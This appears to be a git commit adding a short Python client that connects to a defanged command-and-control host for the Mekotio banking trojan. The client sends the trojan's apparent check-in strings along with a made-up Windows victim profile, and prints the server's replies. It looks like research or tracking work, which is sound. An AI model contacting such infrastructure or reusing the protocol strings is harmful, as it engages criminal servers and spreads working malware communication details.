86b2351dc539ace8ff39a558daca1748a2ef92ca
Ernesto <ernesto.luis.bernal@gmail.com>
2023-06-30 18:27:09 -0300

    Create mekotio-client.py

---
+++ mekotio-client.py
@@ -0,0 +1,17 @@
+# mekotio-client.py
+
+import socket
+from time import sleep
+
+HOST = "boludo{.duia{.us"  #c&cMekotio
+PORT = 7957 #port
+
+with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+    s.connect((HOST, PORT))
+    print("Connecting to:" + HOST + ':' + str(PORT))
+    s.sendall(b'<|SNUNFHXQU|>')
+    data = s.recv(1024)
+    print(f"Received {data!r}")
+    s.sendall(b'<|xywz|>1--03-01-N-96<|>32 - Windows 10.1331.12410<|>CONSECIONARIO JavierP windows defender-galiciacomar<|>CONSECIONARIO DanielO<<|6//&M31R543V36m!galiciacomar')
+    data = s.recv(1024)
+    print(f"Received {data!r}")
